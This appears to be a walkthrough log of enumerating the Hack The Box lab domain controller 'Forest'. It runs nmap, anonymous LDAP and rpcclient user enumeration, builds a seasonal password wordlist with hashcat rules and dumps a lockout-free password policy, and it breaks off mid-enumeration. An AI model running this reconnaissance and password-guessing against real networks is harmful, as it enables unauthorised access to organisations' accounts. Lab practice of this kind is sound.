## Nmap
```bash

nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.129.95.210
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 07:18 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
Initiating Ping Scan at 07:18
Scanning 10.129.95.210 [4 ports]
Completed Ping Scan at 07:18, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:18
Completed Parallel DNS resolution of 1 host. at 07:18, 0.31s elapsed
Initiating SYN Stealth Scan at 07:18
Scanning 10.129.95.210 [65535 ports]
Discovered open port 135/tcp on 10.129.95.210
Discovered open port 139/tcp on 10.129.95.210
Discovered open port 53/tcp on 10.129.95.210
Discovered open port 445/tcp on 10.129.95.210
Discovered open port 49685/tcp on 10.129.95.210
Discovered open port 49681/tcp on 10.129.95.210
Discovered open port 49701/tcp on 10.129.95.210
Discovered open port 3268/tcp on 10.129.95.210
Discovered open port 47001/tcp on 10.129.95.210
Discovered open port 49665/tcp on 10.129.95.210
Discovered open port 593/tcp on 10.129.95.210
Discovered open port 49664/tcp on 10.129.95.210
Discovered open port 464/tcp on 10.129.95.210
Discovered open port 636/tcp on 10.129.95.210
Discovered open port 9389/tcp on 10.129.95.210
Discovered open port 88/tcp on 10.129.95.210
Discovered open port 49671/tcp on 10.129.95.210
Discovered open port 49667/tcp on 10.129.95.210
Discovered open port 3269/tcp on 10.129.95.210
Discovered open port 389/tcp on 10.129.95.210
Discovered open port 49680/tcp on 10.129.95.210
Discovered open port 49666/tcp on 10.129.95.210
Discovered open port 5985/tcp on 10.129.95.210
Completed SYN Stealth Scan at 07:18, 15.40s elapsed (65535 total ports)
Initiating Service scan at 07:18
Scanning 23 services on 10.129.95.210
Completed Service scan at 07:19, 56.91s elapsed (23 services on 1 host)
NSE: Script scanning 10.129.95.210.
Initiating NSE at 07:19
Completed NSE at 07:19, 12.75s elapsed
Initiating NSE at 07:19
Completed NSE at 07:19, 5.05s elapsed
Initiating NSE at 07:19
Completed NSE at 07:19, 0.00s elapsed
Nmap scan report for 10.129.95.210
Host is up (0.17s latency).
Not shown: 65501 closed tcp ports (reset), 11 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-12-19 01:55:17Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49685/tcp open  msrpc        Microsoft Windows RPC
49701/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m49s, deviation: 4h37m08s, median: 6m48s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-12-18T17:56:10-08:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-19T01:56:13
|_  start_date: 2021-12-19T01:53:34

NSE: Script Post-scanning.
Initiating NSE at 07:19
Completed NSE at 07:19, 0.00s elapsed
Initiating NSE at 07:19
Completed NSE at 07:19, 0.00s elapsed
Initiating NSE at 07:19
Completed NSE at 07:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.64 seconds
           Raw packets sent: 67911 (2.988MB) | Rcvd: 67510 (2.700MB)
```           
           
           
           
```
smbclient -L 10.129.95.210 
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# nslookup                                                                                   
> server 10.129.95.210
Default server: 10.129.95.210
Address: 10.129.95.210#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
> 10.129.95.210
;; connection timed out; no servers could be reached

>                                                                                                                                                                                             
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# ldapsearch -h 10.129.95.210                                                                                                                                                         1 ⨯
SASL/EXTERNAL authentication started
ldap_sasl_interactive_bind_s: Unknown authentication method (-6)
        additional info: SASL(-4): no mechanism available: 
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# ldapsearch -h 10.129.95.210 -x                                                                                                                                                    250 ⨯
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021B, problem 2001 (NO_OBJECT), data 0, best 
 match of:
        ''


# numResponses: 1
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# ldapsearch -h 10.129.95.210 -x -s base namingcontexts                                                                                                                              32 ⨯
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local"  
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20211219015324.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 929834
name: htb
objectGUID:: Gsfw30mpJkuMe1Lj4stuqw==
replUpToDateVector:: AgAAAAAAAAASAAAAAAAAAIArugegK3xCjpG3jOKvTZsK8AAAAAAAAPxOm
 RMDAAAAEeYhGk0xaEyawzvMi5bZbx0ADQAAAAAA1L0+FwMAAABptVkf+oupR7OwUi6g1GLsFlADAA
 AAAAAB1aoTAwAAADqjayNZeUFKuVlfgmiaCHEFoAAAAAAAAF8hmRMDAAAA550WLBTQ2UuhowLQP8A
 4SyAwDgAAAAAAkiHPFwMAAAD9IT857pY2TLBDvA9wjXW6GRAEAAAAAABuyT0XAwAAABA8AUG0jJ1F
 iOJ6vAWO49cVMAMAAAAAANXXphMDAAAAtTDGYaJBsEWxNEEatU4xYwjQAAAAAAAAnz2ZEwMAAABOf
 GN4ZhbsSauczVHuYEiBE3ACAAAAAADdbaATAwAAADH0xotFcHlDppuZ8rSNJnAMEAEAAAAAAIbFmR
 MDAAAAtwL+jwq2+0WZliEirTGKpwawAAAAAAAA1ymZEwMAAAAaxJ+QNDLHQ55lTGqoLvfGCwABAAA
 AAADKrZkTAwAAAFBd76JcNvNMvcbhLzeCkdkXoAMAAAAAAGmqqxMDAAAAGcL6qk8Zs0qRG/BZYykq
 ex+QDQAAAAAADsc+FwMAAAB5TzHrWI2FTZJLavLc7Dl3CeAAAAAAAADPRZkTAwAAAMnKXu73q7hBp
 RxZtKkWpCEecA0AAAAAAJnFPhcDAAAAEuOp8cC6t0+uaoe83jqnLQfAAAAAAAAAwzeZEwMAAACevY
 D5RBP7RbrYAQrgjhuPHNAMAAAAAACxrz4XAwAAAA==
creationTime: 132843524041570720
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
---------------------------snip----------------------------------------------------------------



```

```bash
ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(objectClass=Person)'
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectClass=Person)
# requesting: ALL
#

# Guest, Users, htb.local
dn: CN=Guest,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
uSNChanged: 8197
name: Guest
objectGUID:: 3cHbrmUFAEi25kbTT5W9gA==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 16010101000000.0Z

# DefaultAccount, Users, htb.local
dn: CN=DefaultAccount,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: DefaultAccount
description: A user account managed by the system.
distinguishedName: CN=DefaultAccount,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8198
memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
uSNChanged: 8198
name: DefaultAccount
objectGUID:: y2NvxY2HHEaASPoaHAyHpQ==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP9wEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: DefaultAccount
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 20211219021848.0Z
dSCorePropagationData: 16010101000000.0Z

# FOREST, Domain Controllers, htb.local
dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: FOREST
distinguishedName: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20211219015404.0Z
uSNCreated: 12293
uSNChanged: 929839
name: FOREST
objectGUID:: K0qBC+sYak+USTOHz0Cyeg==
userAccountControl: 532480
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132843524618290736
localPolicyFlags: 0
pwdLastSet: 132843524204852322
primaryGroupID: 516
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP6AMAAA==
accountExpires: 9223372036854775807
logonCount: 85
sAMAccountName: FOREST$
sAMAccountType: 805306369
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
serverReferenceBL: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN
 =Configuration,DC=htb,DC=local
dNSHostName: FOREST.htb.local
rIDSetReferences: CN=RID Set,CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
servicePrincipalName: TERMSRV/FOREST
servicePrincipalName: TERMSRV/FOREST.htb.local
servicePrincipalName: exchangeAB/FOREST
servicePrincipalName: exchangeAB/FOREST.htb.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/FOREST.htb.loc
 al
servicePrincipalName: ldap/FOREST.htb.local/ForestDnsZones.htb.local
servicePrincipalName: ldap/FOREST.htb.local/DomainDnsZones.htb.local
servicePrincipalName: DNS/FOREST.htb.local
servicePrincipalName: GC/FOREST.htb.local/htb.local
servicePrincipalName: RestrictedKrbHost/FOREST.htb.local
servicePrincipalName: RestrictedKrbHost/FOREST
servicePrincipalName: RPC/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loca
 l
servicePrincipalName: HOST/FOREST/HTB
servicePrincipalName: HOST/FOREST.htb.local/HTB
servicePrincipalName: HOST/FOREST
servicePrincipalName: HOST/FOREST.htb.local
servicePrincipalName: HOST/FOREST.htb.local/htb.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/236ba33a-7959-4a41-
 b959-5f82689a0871/htb.local
servicePrincipalName: ldap/FOREST/HTB
servicePrincipalName: ldap/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loc
 al
servicePrincipalName: ldap/FOREST.htb.local/HTB
servicePrincipalName: ldap/FOREST
servicePrincipalName: ldap/FOREST.htb.local
servicePrincipalName: ldap/FOREST.htb.local/htb.local
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211219021849.0Z
dSCorePropagationData: 20211219021849.0Z
dSCorePropagationData: 20211219021849.0Z
dSCorePropagationData: 20211219021849.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132843524442040443
msDS-SupportedEncryptionTypes: 28
msDS-GenerationId:: 3de9L9zxF8g=
```


```bash
ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName 
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectClass=Person)
# requesting: sAMAccountName 
#

# Guest, Users, htb.local
dn: CN=Guest,CN=Users,DC=htb,DC=local
sAMAccountName: Guest

# DefaultAccount, Users, htb.local
dn: CN=DefaultAccount,CN=Users,DC=htb,DC=local
sAMAccountName: DefaultAccount

# FOREST, Domain Controllers, htb.local
dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
sAMAccountName: FOREST$

# EXCH01, Computers, htb.local
dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
sAMAccountName: EXCH01$

# Exchange Online-ApplicationAccount, Users, htb.local
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
sAMAccountName: $331000-VK4ADACQNUCA

# SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}, Users, htb.local
dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=
 local
sAMAccountName: SM_2c8eef0a09b545acb

# SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}, Users, htb.local
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=
 local
sAMAccountName: SM_ca8c2ed5bdab4dc9b

# SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}, Users, htb.local
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=
 local
sAMAccountName: SM_75a538d3025e4db9a

# DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}, Users, htb.loc
 al
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
 DC=htb,DC=local
sAMAccountName: SM_681f53d4942840e18

# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, htb.local
dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
sAMAccountName: SM_1b41c9286325456bb

# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, htb.local
dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=
 local
sAMAccountName: SM_9b69f1b9d2cc45549

# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, htb.local
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
 local
sAMAccountName: SM_7c96b981967141ebb

# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, htb.local
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
 local
sAMAccountName: SM_c75ee099d0a64c91b

# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, htb.local
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
 local
sAMAccountName: SM_1ffab36a2f5f479cb

# HealthMailboxc3d7722415ad41a5b19e3e00e165edbe, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailboxc3d7722

# HealthMailboxfc9daad117b84fe08b081886bd8a5a50, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailboxfc9daad

# HealthMailboxc0a90c97d4994429b15003d6a518f3f5, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailboxc0a90c9

# HealthMailbox670628ec4dd64321acfdf6e67db3a2d8, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailbox670628e

# HealthMailbox968e74dd3edb414cb4018376e7dd95ba, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailbox968e74d

# HealthMailbox6ded67848a234577a1756e072081d01f, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailbox6ded678

# HealthMailbox83d6781be36b4bbf8893b03c2ee379ab, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailbox83d6781

# HealthMailboxfd87238e536e49e08738480d300e3772, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailboxfd87238

# HealthMailboxb01ac647a64648d2a5fa21df27058a24, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailboxb01ac64

# HealthMailbox7108a4e350f84b32a7a90d8e718f78cf, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailbox7108a4e

# HealthMailbox0659cc188f4c4f9f978f6c2142c4181e, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
sAMAccountName: HealthMailbox0659cc1

# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
 htb.local
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
 =Employees,DC=htb,DC=local
sAMAccountName: sebastien

# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
 DC=htb,DC=local
sAMAccountName: lucinda

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
sAMAccountName: andy
```



```
ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName 
# requesting: sAMAccountName 
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# ldapsearch -h 10.129.95.210 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# nvim userlist.ldap 
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# nvim              
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# nvim pass         
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# for i in $(cat pass); do echo $i; echo ${i}2019; echo ${i}2020; done
January
January2019
January2020
February
February2019
February2020
March
March2019
March2020
April
April2019
April2020
May
May2019
May2020
June
June2019
June2020
July

---------------------------------------------------------snip-------------------------------------
```


```
hashcat --force --stdout pass -r /usr/share/hashcat/rules/best6        
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# for i in $(cat pass); do echo $i; echo ${i}\!; done > t                                                                                                                           130 ⨯
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# cp t pass                                              
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# less pass
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# hashcat --force --stdout pass -r /usr/share/hashcat/rules/best64.rule 
January
yraunaJ
JANUARY
january
January0
January1
January2
January3
January4
January5
---------------------------------------------------------snip-----------------------------------------------------------------
```


```
crackmapexec smb 10.129.95.210 --pass-pol
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.129.95.210   445    FOREST           Minimum password length: 7
SMB         10.129.95.210   445    FOREST           Password history length: 24
SMB         10.129.95.210   445    FOREST           Maximum password age: Not Set
SMB         10.129.95.210   445    FOREST           
SMB         10.129.95.210   445    FOREST           Password Complexity Flags: 000000
SMB         10.129.95.210   445    FOREST               Domain Refuse Password Change: 0
SMB         10.129.95.210   445    FOREST               Domain Password Store Cleartext: 0
SMB         10.129.95.210   445    FOREST               Domain Password Lockout Admins: 0
SMB         10.129.95.210   445    FOREST               Domain Password No Clear Change: 0
SMB         10.129.95.210   445    FOREST               Domain Password No Anon Change: 0
SMB         10.129.95.210   445    FOREST               Domain Password Complex: 0
SMB         10.129.95.210   445    FOREST           
SMB         10.129.95.210   445    FOREST           Minimum password age: 1 day 4 minutes 
SMB         10.129.95.210   445    FOREST           Reset Account Lockout Counter: 30 minutes 
SMB         10.129.95.210   445    FOREST           Locked Account Duration: 30 minutes 
SMB         10.129.95.210   445    FOREST           Account Lockout Threshold: None
SMB         10.129.95.210   445    FOREST           Forced Log off Time: Not Set
```



```
rpcclient 10.129.95.210 -U '' -N                                                                                                                                                    1 ⨯
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> queryusergroups 0x47b
        group rid:[0x201] attr:[0x7]
        group rid:[0x47c] attr:[0x7]
rpcclient $> querygroup 0x201
        Group Name:     Domain Users
        Description:    All domain users
        Group Attribute:7
        Num Members:30
rpcclient $> querygroup 0x47c
        Group Name:     Service Accounts
        Description:
        Group Attribute:7
        Num Members:1
rpcclient $> queryuser 0x47b
        User Name   :   svc-alfresco
        Full Name   :   svc-alfresco
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
